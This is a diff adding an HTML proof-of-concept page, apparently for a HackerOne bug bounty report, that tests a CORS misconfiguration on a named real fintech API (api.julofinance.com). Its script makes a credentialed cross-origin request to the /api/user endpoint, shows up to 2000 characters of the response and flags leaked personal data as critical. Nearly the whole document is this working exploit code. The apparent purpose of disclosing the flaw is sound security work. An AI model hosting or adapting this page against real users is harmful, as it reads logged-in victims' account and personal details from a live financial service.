@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>PoC - Julo CORS - Naffinc</title>
+<style>
+body { background:#0a0a0a; color:#00FF00; font-family: monospace; padding:20px; }
+.box { padding:15px; margin:10px 0; border-radius:8px; font-weight:bold; }
+.low { background:#00FF00; color:#000; } /* Hijau Low */
+.medium { background:orange; color:#000; } /* Orange Medium */
+.high { background:yellow; color:#000; } /* Kuning High */
+.critical { background:red; color:#fff; } /* Merah Critical */
+pre { background:#111; padding:15px; border:1px solid #00FF00; overflow:auto; }
+</style>
+</head>
+<body>
+<h2>BUG BOUNTY POC - api.julofinance.com - HackerOne: Naffinc</h2>
+<p>Origin: https://naffincindonesia.github.io/poc.html</p>
+<div id="status" class="box low">Testing...</div>
+<pre id="result">Waiting for response...</pre>
+
+<script>
+const target = "https://api.julofinance.com/api/user";
+fetch(target, { method:"GET", credentials:"include" })
+.then(r => {
+  const origin = r.headers.get("access-control-allow-origin");
+  const creds = r.headers.get("access-control-allow-credentials");
+  let sev = "low";
+  let cls = "low";
+  let text = "";
+
+  if(origin && creds === "true") {
+     if(origin === "https://naffincindonesia.github.io/poc.html" || origin.includes("naffinc")) {
+        // Reflect your domain = High (kuning)
+        sev = "HIGH - CORS reflects your domain + credentials true";
+        cls = "high";
+     } else {
+        // Kalau reflect * atau arbitrary
+        sev = "CRITICAL - Arbitrary origin reflected";
+        cls = "critical";
+     }
+  }
+  document.getElementById("status").className = "box "+cls;
+  document.getElementById("status").innerText = sev + " | A-C-A-O: " + origin + " | A-C-A-C: " + creds;
+  return r.text();
+})
+.then(data => {
+  document.getElementById("result").innerText = data.substring(0,2000);
+  // Jika data ada PII, upgrade ke Critical Merah
+  if(data.includes("email") || data.includes("phone") || data.includes("user")) {
+    document.getElementById("status").className = "box critical";
+    document.getElementById("status").innerText += " | PII LEAKED = CRITICAL (Merah)";
+  }
+})
+.catch(err => {
+  document.getElementById("status").className = "box low";
+  document.getElementById("status").innerText = "LOW - Not vulnerable or blocked by browser";
+  document.getElementById("result").innerText = err;
+});
+</script>
+</body>
+</html>
